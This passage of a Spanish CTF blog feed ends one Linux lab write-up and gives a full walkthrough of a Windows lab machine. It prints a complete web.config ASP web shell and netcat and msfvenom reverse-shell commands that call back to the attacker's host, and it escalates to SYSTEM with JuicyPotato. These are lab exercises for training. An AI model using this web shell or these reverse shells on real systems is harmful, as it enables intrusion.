<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>juan@4c6b113dd021:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
total 32
drwxr-x--- 3 juan juan 4096 Jun 17 09:02 <span class="nb">.</span>
drwxr-xr-x 1 root root 4096 Jun 17 08:22 ..
<span class="nt">-rw-r--r--</span> 1 juan juan  220 Jun 17 08:22 .bash_logout
<span class="nt">-rw-r--r--</span> 1 juan juan 3791 Jun 17 08:42 .bashrc
drwxrwxr-x 3 juan juan 4096 Jun 17 08:41 .local
<span class="nt">-rw-rw-r--</span> 1 juan juan  112 Jun 17 08:45 .ordenes_nuevas
<span class="nt">-rw-r--r--</span> 1 juan juan  807 Jun 17 08:22 .profile
</code></pre></div></div>

<p>Vemos el fichero<code class="language-plaintext highlighter-rouge">.ordenes_nuevas</code>, lo abrimos:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>juan@4c6b113dd021:~<span class="nv">$ </span><span class="nb">cat</span> .ordenes_nuevas 
Hola soy tu patron y me canse y me fui a casa te dejo mi pass en un lugar a mano consiguelo y acaba el trabajo.
</code></pre></div></div>

<h1 id="escalada-de-privilegios">Escalada de privilegios</h1>

<p>Buscanos dentro del fichero<code class="language-plaintext highlighter-rouge">.bashrc</code> y encontramos la password del patrón:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>juan@4c6b113dd021:~<span class="nv">$ </span><span class="nb">cat</span> .bashrc
<span class="nb">alias </span><span class="nv">pass</span><span class="o">=</span><span class="s1">'eljefe'</span>
</code></pre></div></div>

<p>Nos logueamos como root y finalizamos la máquina:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>juan@4c6b113dd021:~<span class="nv">$ </span>su
Password: 
root@4c6b113dd021:/home/juan# <span class="nb">cd</span> ~
root@4c6b113dd021:~#
</code></pre></div></div>]]></content><author><name>murrusko</name><email>murrusko@proton.me</email></author><category term="dockerlabs" /><category term="ctf" /><category term="linux" /><category term="medio" /><summary type="html"><![CDATA[Estamos ante un docker que contiene una distribución Linux. Es de nivel medio y es de la plataforma dockerlabs.]]></summary></entry><entry><title type="html">Ensala de papas</title><link href="/posts/Ensala/" rel="alternate" type="text/html" title="Ensala de papas" /><published>2024-06-21T00:00:00+00:00</published><updated>2024-06-21T00:00:00+00:00</updated><id>/posts/Ensala</id><content type="html" xml:base="/posts/Ensala/"><![CDATA[<p>Estamos ante una máquina Windows de nivel principiante creada por <a href="https://www.curiosidadesdehackers.com/">CuriosidadesDeHackers</a> y <a href="https://www.youtube.com/@CondorHacks">condor</a> de la plataforma <a href="https://thehackerslabs.com/">The Hackers Labs</a>.</p>

<h1 id="enumeración">Enumeración</h1>

<p>Una vez importada la máquina a nuestro VirtualBox hacemos un escaneo de IPs a nuestra red:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>arp-scan <span class="nt">-I</span> eth1 <span class="nt">--localnet</span>
Interface: eth1, <span class="nb">type</span>: EN10MB, MAC: 08:00:27:5e:91:9b, IPv4: 10.0.2.5
Starting arp-scan 1.10.0 with 256 hosts <span class="o">(</span>https://github.com/royhills/arp-scan<span class="o">)</span>
10.0.2.1        52:54:00:12:35:00       QEMU
10.0.2.2        52:54:00:12:35:00       QEMU
10.0.2.3        08:00:27:5b:2e:9c       PCS Systemtechnik GmbH
10.0.2.140      08:00:27:09:18:96       PCS Systemtechnik GmbH

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned <span class="k">in </span>2.017 seconds <span class="o">(</span>126.92 hosts/sec<span class="o">)</span><span class="nb">.</span> 4 responded
</code></pre></div></div>

<p>Como vemos la máquina tiene asignada la IP <code class="language-plaintext highlighter-rouge">10.0.2.140</code>.</p>

<p>Empezamos realizando un escaneo de puertos con <code class="language-plaintext highlighter-rouge">nmap</code>. Hacemos un escaneo silencioso<code class="language-plaintext highlighter-rouge">-sS</code>, a todos los puertos <code class="language-plaintext highlighter-rouge">-p-</code>, que nos de detalles del escaneo <code class="language-plaintext highlighter-rouge">-v</code>, que no haga ping al host <code class="language-plaintext highlighter-rouge">-Pn</code>, que no haga resolución de DNS <code class="language-plaintext highlighter-rouge">-n</code> a nuestra máquina victima <code class="language-plaintext highlighter-rouge">10.0.2.140</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sS</span> <span class="nt">-p-</span> <span class="nt">-v</span> <span class="nt">-Pn</span> <span class="nt">-n</span> 10.0.2.140
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
47001/tcp open  winrm
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49158/tcp open  unknown
</code></pre></div></div>

<p>Una vex que tenemos qué puertos están abiertos hacemos otro escaneo con <code class="language-plaintext highlighter-rouge">nmap</code>, pero esta vez para ver con mas detalle que hay en esos puertos:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p80</span>,135,139,445,47001,49152,49153,49154,49155,49156,49158 <span class="nt">-v</span> 10.0.2.140
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 7.5
|_http-title: IIS7
|_http-server-header: Microsoft-IIS/7.5
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49156/tcp open  msrpc         Microsoft Windows RPC
49158/tcp open  msrpc         Microsoft Windows RPC

Host script results:
| nbstat: NetBIOS name: WIN-4QU3QNHNK7E, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 08:00:27:09:18:96 <span class="o">(</span>Oracle VirtualBox virtual NIC<span class="o">)</span>
| Names:
|   WIN-4QU3QNHNK7E&lt;00&gt;  Flags: &lt;unique&gt;&lt;active&gt;
|   WORKGROUP&lt;00&gt;        Flags: &lt;group&gt;&lt;active&gt;
|_  WIN-4QU3QNHNK7E&lt;20&gt;  Flags: &lt;unique&gt;&lt;active&gt;
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
|_clock-skew: 2m18s
| smb2-time: 
|   <span class="nb">date</span>: 2024-06-21T11:29:29
|_  start_date: 2024-06-21T09:27:55
</code></pre></div></div>

<p>En el resultado vemos que en el puerto <code class="language-plaintext highlighter-rouge">80</code> hay un servidor <code class="language-plaintext highlighter-rouge">Microsoft-IIS/7.5</code>.</p>

<p>Comprobamos que realmente hay un servidor  <code class="language-plaintext highlighter-rouge">IIS 7.5</code> con <code class="language-plaintext highlighter-rouge">whatweb</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>whatweb <span class="nt">-a</span> 3 <span class="nt">-v</span> http://10.0.2.140
WhatWeb report <span class="k">for </span>http://10.0.2.140
Status    : 200 OK
Title     : IIS7
IP        : 10.0.2.140
Country   : RESERVED, ZZ

Summary   : HTTPServer[Microsoft-IIS/7.5], Microsoft-IIS[7.5][Under Construction], X-Powered-By[ASP.NET]

Detected Plugins:
<span class="o">[</span> HTTPServer <span class="o">]</span>
        HTTP server header string. This plugin also attempts to 
        identify the operating system from the server header. 

        String       : Microsoft-IIS/7.5 <span class="o">(</span>from server string<span class="o">)</span>

<span class="o">[</span> Microsoft-IIS <span class="o">]</span>
        Microsoft Internet Information Services <span class="o">(</span>IIS<span class="o">)</span> <span class="k">for </span>Windows 
        Server is a flexible, secure and easy-to-manage Web server 
        <span class="k">for </span>hosting anything on the Web. From media streaming to 
        web application hosting, IIS<span class="s1">'s scalable and open 
        architecture is ready to handle the most demanding tasks. 

        Module       : Under Construction
        Version      : 7.5
        Website     : http://www.iis.net/

[ X-Powered-By ]
        X-Powered-By HTTP header 

        String       : ASP.NET (from x-powered-by string)

HTTP Headers:
        HTTP/1.1 200 OK
        Content-Type: text/html
        Last-Modified: Tue, 18 Jun 2024 15:19:13 GMT
        Accept-Ranges: bytes
        ETag: "8c9090e092c1da1:0"
        Server: Microsoft-IIS/7.5
        X-Powered-By: ASP.NET
        Date: Fri, 21 Jun 2024 11:30:34 GMT
        Connection: close
        Content-Length: 689
</span></code></pre></div></div>

<p>Con <code class="language-plaintext highlighter-rouge">curl</code> vemos que hay una página web por defecto de <code class="language-plaintext highlighter-rouge">IIS</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl http://10.0.2.140
&lt;<span class="o">!</span>DOCTYPE html PUBLIC <span class="s2">"-//W3C//DTD XHTML 1.0 Strict//EN"</span> <span class="s2">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"</span><span class="o">&gt;</span>
&lt;html <span class="nv">xmlns</span><span class="o">=</span><span class="s2">"http://www.w3.org/1999/xhtml"</span><span class="o">&gt;</span>
&lt;<span class="nb">head</span><span class="o">&gt;</span>
&lt;meta http-equiv<span class="o">=</span><span class="s2">"Content-Type"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"text/html; charset=iso-8859-1"</span> /&gt;
&lt;title&gt;IIS7&lt;/title&gt;
&lt;style <span class="nb">type</span><span class="o">=</span><span class="s2">"text/css"</span><span class="o">&gt;</span>
&lt;<span class="o">!</span><span class="nt">--</span>
body <span class="o">{</span>
        color:#000000<span class="p">;</span>
        background-color:#B3B3B3<span class="p">;</span>
        margin:0<span class="p">;</span>
<span class="o">}</span>

<span class="c">#container {</span>
        margin-left:auto<span class="p">;</span>
        margin-right:auto<span class="p">;</span>
        text-align:center<span class="p">;</span>
        <span class="o">}</span>

a img <span class="o">{</span>
        border:none<span class="p">;</span>
<span class="o">}</span>

<span class="nt">--</span><span class="o">&gt;</span>
&lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;div <span class="nb">id</span><span class="o">=</span><span class="s2">"container"</span><span class="o">&gt;</span>
&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">"http://go.microsoft.com/fwlink/?linkid=66138&amp;amp;clcid=0x409"</span><span class="o">&gt;</span>&lt;img <span class="nv">src</span><span class="o">=</span><span class="s2">"welcome.png"</span> <span class="nv">alt</span><span class="o">=</span><span class="s2">"IIS7"</span> <span class="nv">width</span><span class="o">=</span><span class="s2">"571"</span> <span class="nv">height</span><span class="o">=</span><span class="s2">"411"</span> /&gt;&lt;/a&gt;
&lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre></div></div>

<p>Usamos la herramienta <code class="language-plaintext highlighter-rouge">feroxbuster</code> para hacer fuzz al servidor. Le indicamos con <code class="language-plaintext highlighter-rouge">-u</code> la url, con <code class="language-plaintext highlighter-rouge">-w</code> el diccionario a usar para la búsqueda, <code class="language-plaintext highlighter-rouge">-x</code> para indicarle qué extensión buscar en los ficheros, <code class="language-plaintext highlighter-rouge">-s</code> para que solo nos devuelva los directorios y ficheros que encuentre y que devuelvan de Status Code 200 y <code class="language-plaintext highlighter-rouge">-r</code> para seguir los redirecciones:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>feroxbuster <span class="nt">-u</span> http://10.0.2.140 <span class="nt">-w</span> /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt <span class="nt">-x</span> aspx <span class="nt">-s</span> 200 <span class="nt">-r</span>
200      GET      826l     4457w   331772c http://10.0.2.140/welcome.png
200      GET       32l       53w      689c http://10.0.2.140/200      GET      121l       61w     1159c http://10.0.2.140/zoc.aspx
</code></pre></div></div>

<p>Encontramos el fichero <code class="language-plaintext highlighter-rouge">zoc.aspx</code>. Hacemos un <code class="language-plaintext highlighter-rouge">curl</code> para ver el código fuente del fichero:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>─<span class="nv">$ </span>curl http://10.0.2.140/zoc.aspx

&lt;<span class="o">!</span>DOCTYPE html PUBLIC <span class="s2">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span> <span class="s2">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"</span><span class="o">&gt;</span>

&lt;html <span class="nv">xmlns</span><span class="o">=</span><span class="s2">"http://www.w3.org/1999/xhtml"</span> <span class="o">&gt;</span>
&lt;<span class="nb">head id</span><span class="o">=</span><span class="s2">"Head1"</span><span class="o">&gt;</span>&lt;title&gt;
        Secure File Transfer
&lt;/title&gt;&lt;/head&gt;
&lt;body&gt;
    &lt;form <span class="nv">name</span><span class="o">=</span><span class="s2">"form1"</span> <span class="nv">method</span><span class="o">=</span><span class="s2">"post"</span> <span class="nv">action</span><span class="o">=</span><span class="s2">"zoc.aspx"</span> <span class="nb">id</span><span class="o">=</span><span class="s2">"form1"</span> <span class="nv">enctype</span><span class="o">=</span><span class="s2">"multipart/form-data"</span><span class="o">&gt;</span>
&lt;input <span class="nb">type</span><span class="o">=</span><span class="s2">"hidden"</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"__VIEWSTATE"</span> <span class="nb">id</span><span class="o">=</span><span class="s2">"__VIEWSTATE"</span> <span class="nv">value</span><span class="o">=</span><span class="s2">"/wEPDwUKMTI3ODM5MzQ0Mg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkPcJGUl1Hy844izHTIhfkoIHDrbw="</span> /&gt;

&lt;input <span class="nb">type</span><span class="o">=</span><span class="s2">"hidden"</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"__EVENTVALIDATION"</span> <span class="nb">id</span><span class="o">=</span><span class="s2">"__EVENTVALIDATION"</span> <span class="nv">value</span><span class="o">=</span><span class="s2">"/wEWAgL3iIH+DALt3oXMAw1C+wxpDnf+65aqZtzoxIjF/bl8"</span> /&gt;
    &lt;div&gt;
        &lt;input <span class="nb">type</span><span class="o">=</span><span class="s2">"file"</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"FileUpload1"</span> <span class="nb">id</span><span class="o">=</span><span class="s2">"FileUpload1"</span> /&gt;
        &lt;input <span class="nb">type</span><span class="o">=</span><span class="s2">"submit"</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"btnUpload"</span> <span class="nv">value</span><span class="o">=</span><span class="s2">"Upload"</span> <span class="nv">onclick</span><span class="o">=</span><span class="s2">"return ValidateFile();"</span> <span class="nb">id</span><span class="o">=</span><span class="s2">"btnUpload"</span> /&gt;
        &lt;br /&gt;
        &lt;span <span class="nb">id</span><span class="o">=</span><span class="s2">"Label1"</span><span class="o">&gt;</span>&lt;/span&gt;
    &lt;/div&gt;
    &lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;

&lt;<span class="o">!</span><span class="nt">--</span> /Subiditosdetono <span class="nt">--</span><span class="o">&gt;</span>
</code></pre></div></div>

<p>Vemos que hay un comentario de un supuesto directorio <code class="language-plaintext highlighter-rouge">/Subiditosdetono</code>.</p>

<p>Si entramos a la url vemos que es una web simple para subir un fichero:</p>

<p><img src="/assets/images/ensala/1.png" alt="image" /></p>

<p>En <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/iis-internet-information-services">hacktricks</a> podemos ver que tipo de ficheros podemos subir al servidor IIS. Vemos que entre los posibles tipos de ficheros esta el <code class="language-plaintext highlighter-rouge">.config</code> . En la misma web podemos encontrar un ejemplo que nos permite hacer ejecucion remota. Nos descargamos el fichero <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config">web.config</a> y lo subimos al servidor.</p>

<p>El fichero <code class="language-plaintext highlighter-rouge">web.config</code>:</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
<span class="nt">&lt;configuration&gt;</span>
   <span class="nt">&lt;system.webServer&gt;</span>
      <span class="nt">&lt;handlers</span> <span class="na">accessPolicy=</span><span class="s">"Read, Script, Write"</span><span class="nt">&gt;</span>
         <span class="nt">&lt;add</span> <span class="na">name=</span><span class="s">"web_config"</span> <span class="na">path=</span><span class="s">"*.config"</span> <span class="na">verb=</span><span class="s">"*"</span> <span class="na">modules=</span><span class="s">"IsapiModule"</span> <span class="na">scriptProcessor=</span><span class="s">"%windir%\system32\inetsrv\asp.dll"</span> <span class="na">resourceType=</span><span class="s">"Unspecified"</span> <span class="na">requireAccess=</span><span class="s">"Write"</span> <span class="na">preCondition=</span><span class="s">"bitness64"</span> <span class="nt">/&gt;</span>         
      <span class="nt">&lt;/handlers&gt;</span>
      <span class="nt">&lt;security&gt;</span>
         <span class="nt">&lt;requestFiltering&gt;</span>
            <span class="nt">&lt;fileExtensions&gt;</span>
               <span class="nt">&lt;remove</span> <span class="na">fileExtension=</span><span class="s">".config"</span> <span class="nt">/&gt;</span>
            <span class="nt">&lt;/fileExtensions&gt;</span>
            <span class="nt">&lt;hiddenSegments&gt;</span>
               <span class="nt">&lt;remove</span> <span class="na">segment=</span><span class="s">"web.config"</span> <span class="nt">/&gt;</span>
            <span class="nt">&lt;/hiddenSegments&gt;</span>
         <span class="nt">&lt;/requestFiltering&gt;</span>
      <span class="nt">&lt;/security&gt;</span>
   <span class="nt">&lt;/system.webServer&gt;</span>
<span class="nt">&lt;/configuration&gt;</span>
<span class="c">&lt;!--
&lt;% Response.write("-"&amp;"-&gt;")%&gt;
&lt;%
Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")

Function getCommandOutput(theCommand)
    Dim objShell, objCmdExec
    Set objShell = CreateObject("WScript.Shell")
    Set objCmdExec = objshell.exec(thecommand)

    getCommandOutput = objCmdExec.StdOut.ReadAll
end Function
%&gt;

&lt;BODY&gt;
&lt;FORM action="" method="GET"&gt;
&lt;input type="text" name="cmd" size=45 value="&lt;%= szCMD %&gt;"&gt;
&lt;input type="submit" value="Run"&gt;
&lt;/FORM&gt;

&lt;PRE&gt;
&lt;%= "\\" &amp; oScriptNet.ComputerName &amp; "\" &amp; oScriptNet.UserName %&gt;
&lt;%Response.Write(Request.ServerVariables("server_name"))%&gt;
&lt;p&gt;
&lt;b&gt;The server's port:&lt;/b&gt;
&lt;%Response.Write(Request.ServerVariables("server_port"))%&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;b&gt;The server's software:&lt;/b&gt;
&lt;%Response.Write(Request.ServerVariables("server_software"))%&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;b&gt;The server's software:&lt;/b&gt;
&lt;%Response.Write(Request.ServerVariables("LOCAL_ADDR"))%&gt;
&lt;% szCMD = request("cmd")
thisDir = getCommandOutput("cmd /c" &amp; szCMD)
Response.Write(thisDir)%&gt;
&lt;/p&gt;
&lt;br&gt;
&lt;/BODY&gt;

&lt;%Response.write("&lt;!-"&amp;"-") %&gt;
--&gt;</span>
</code></pre></div></div>
<p><img src="/assets/images/ensala/2.png" alt="image" /></p>

<p>Ejecutamos <code class="language-plaintext highlighter-rouge">systeminfo</code> para obtener información del sistema.</p>

<p><img src="/assets/images/ensala/3.png" alt="image" /></p>

<p>Vemos que se trata de un <code class="language-plaintext highlighter-rouge">Windows Server 2008 Enterprise R 2</code> .</p>

<p>Ejecutamos <code class="language-plaintext highlighter-rouge">whoami /priv</code> para ver con que usuario estamos ejecutando los comandos y ver sus privilegios.</p>

<p><img src="/assets/images/ensala/4.png" alt="image" /></p>

<p>Como vemos tiene el privilegio <code class="language-plaintext highlighter-rouge">SeImpersonatePrivilege</code> habilitado…</p>

<h1 id="intrusión">Intrusión</h1>

<p>Nos copiamos <code class="language-plaintext highlighter-rouge">Netcat</code> en nuestro directorio:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cp</span> /usr/share/windows-binaries/nc.exe <span class="nb">.</span>
</code></pre></div></div>

<p>Para compartir ficheros con la máquina victima creamos un servidor samba en nuestra máquina. Usamos <code class="language-plaintext highlighter-rouge">impacket-smbserver</code> para crear el server, <code class="language-plaintext highlighter-rouge">-smb2support</code> para dar soporte a smb2, <code class="language-plaintext highlighter-rouge">kali</code> es el nombre que le doy al recurso compartido y <code class="language-plaintext highlighter-rouge">.</code> para compartir lo que tenemos en el directorio actual.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>impacket-smbserver <span class="nt">-smb2support</span> kali <span class="nb">.</span>
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
</code></pre></div></div>

<p>Nos ponemos a la escucha:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-nlvp</span> 8888
listening on <span class="o">[</span>any] 8888 ...

</code></pre></div></div>

<p>Y tras ejecutar <code class="language-plaintext highlighter-rouge">\\10.0.2.5\kali\nc.exe -e cmd 10.0.2.5 8888</code></p>

<p><img src="/assets/images/ensala/5.png" alt="image" /></p>

<p>Obtenemos la shell:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─<span class="nv">$ </span>nc <span class="nt">-nlvp</span> 8888
listening on <span class="o">[</span>any] 8888 ...
connect to <span class="o">[</span>10.0.2.5] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.0.2.140] 49161
Microsoft Windows <span class="o">[</span>Versi?n 6.1.7600]
Copyright <span class="o">(</span>c<span class="o">)</span> 2009 Microsoft Corporation. Reservados todos los derechos.

c:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\i</span>netsrv&gt;
</code></pre></div></div>

<h1 id="escalada-de-privilegios">Escalada de privilegios</h1>

<p>Ahora nos queda obtener privilegios de administrador. Para ello, como hemos visto antes, nos aprovechamos de los privilegios del usuario. En <a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens">hacktricks</a> vemos las diferentes posibilidades que tenemos. Yo voy a usar <a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/juicypotato">JuicyPotato</a> para la escalada.</p>

<p>Descargamos <a href="https://objects.githubusercontent.com/github-production-release-asset-2e65be/142582717/538c8db8-9c94-11e8-84e5-46a5d9473358?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=releaseassetproduction%2F20240621%2Fus-east-1%2Fs3%2Faws4_request&amp;X-Amz-Date=20240621T172808Z&amp;X-Amz-Expires=300&amp;X-Amz-Signature=cc316de6c04358d3f93c007d7c6ca6e16edc972949549ffce1471cc4526e01e0&amp;X-Amz-SignedHeaders=host&amp;actor_id=0&amp;key_id=0&amp;repo_id=142582717&amp;response-content-disposition=attachment%3B%20filename%3DJuicyPotato.exe&amp;response-content-type=application%2Foctet-stream">JuicyPotato</a> :</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
</code></pre></div></div>

<p>Creamos una shell reversa para windows con <code class="language-plaintext highlighter-rouge">msfvenom</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.0.2.5 <span class="nv">LPORT</span><span class="o">=</span>8889 <span class="nt">-f</span> exe <span class="nt">-o</span> shell.exe
</code></pre></div></div>

<p>Nos ponemos a la escucha:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-nlvp</span> 8889
listening on <span class="o">[</span>any] 8889 ...

</code></pre></div></div>

<p>Y ejecutamos:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\i</span>netsrv&gt;<span class="se">\\</span>10.0.2.5<span class="se">\k</span>ali<span class="se">\J</span>uicyPotato.exe <span class="nt">-l</span> 443 <span class="nt">-t</span> <span class="k">*</span> <span class="nt">-p</span> <span class="se">\\</span>10.0.2.5<span class="se">\k</span>ali<span class="se">\s</span>hell.exe
<span class="se">\\</span>10.0.2.5<span class="se">\k</span>ali<span class="se">\J</span>uicyPotato.exe <span class="nt">-l</span> 443 <span class="nt">-t</span> <span class="k">*</span> <span class="nt">-p</span> <span class="se">\\</span>10.0.2.5<span class="se">\k</span>ali<span class="se">\s</span>hell.exe
Testing <span class="o">{</span>4991d34b-80a1-4291-83b6-3328366b9097<span class="o">}</span> 443
COM -&gt; recv failed with error: 10038
</code></pre></div></div>

<p>Vemos que da error y si buscamos el error encontramos que es debido a que el CLSID que proporciona por defecto JuicyPotato no es valido. Los CLSID para los diferentes Windows podemos encontrar en el siguiente link <a href="https://ohpe.it/juicy-potato/CLSID/Windows_Server_2008_R2_Enterprise/">https://ohpe.it/juicy-potato/CLSID/Windows_Server_2008_R2_Enterprise/</a></p>

<p>Ejecutamos de nuevo incluyendo un CLSID valido y…:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\i</span>netsrv&gt;<span class="se">\\</span>10.0.2.5<span class="se">\k</span>ali<span class="se">\J</span>uicyPotato.exe <span class="nt">-l</span> 443 <span class="nt">-t</span> <span class="k">*</span> <span class="nt">-p</span> <span class="se">\\</span>10.0.2.5<span class="se">\k</span>ali<span class="se">\s</span>hell.exe <span class="nt">-c</span> <span class="s2">"{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}"</span>
<span class="se">\\</span>10.0.2.5<span class="se">\k</span>ali<span class="se">\J</span>uicyPotato.exe <span class="nt">-l</span> 443 <span class="nt">-t</span> <span class="k">*</span> <span class="nt">-p</span> <span class="se">\\</span>10.0.2.5<span class="se">\k</span>ali<span class="se">\s</span>hell.exe <span class="nt">-c</span> <span class="s2">"{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}"</span><span class="se">\\</span>10.0.2.5<span class="se">\k</span>ali<span class="se">\J</span>uicyPotato.exe <span class="nt">-l</span> 443 <span class="nt">-t</span> <span class="k">*</span> <span class="nt">-p</span> <span class="se">\\</span>10.0.2.5<span class="se">\k</span>ali<span class="se">\s</span>hell.exe <span class="nt">-c</span> <span class="s2">"{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}"</span>
Testing <span class="o">{</span>9B1F122C-2982-4e91-AA8B-E071D54F2A4D<span class="o">}</span> 443
....
<span class="o">[</span>+] authresult 0
<span class="o">{</span>9B1F122C-2982-4e91-AA8B-E071D54F2A4D<span class="o">}</span><span class="p">;</span>NT AUTHORITY<span class="se">\S</span>YSTEM

<span class="o">[</span>+] CreateProcessWithTokenW OK

c:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\i</span>netsrv&gt;
</code></pre></div></div>

<p>Obtenemos una shell como <code class="language-plaintext highlighter-rouge">nt authority\system</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─<span class="nv">$ </span>nc <span class="nt">-nlvp</span> 8889
listening on <span class="o">[</span>any] 8889 ...
connect to <span class="o">[</span>10.0.2.5] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.0.2.140] 49173
Microsoft Windows <span class="o">[</span>Versi?n 6.1.7600]
Copyright <span class="o">(</span>c<span class="o">)</span> 2009 Microsoft Corporation. Reservados todos los derechos.

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami
<span class="nb">whoami
</span>nt authority<span class="se">\s</span>ystem
</code></pre></div></div>]]></content><author><name>murrusko</name><email>murrusko@proton.me</email></author><category term="thl" /><category term="ctf" /><category term="windows" /><category term="principiante" /><summary type="html"><![CDATA[Estamos ante una máquina Windows de nivel principiante creada por CuriosidadesDeHackers y condor de la plataforma The Hackers Labs.]]></summary></entry></feed>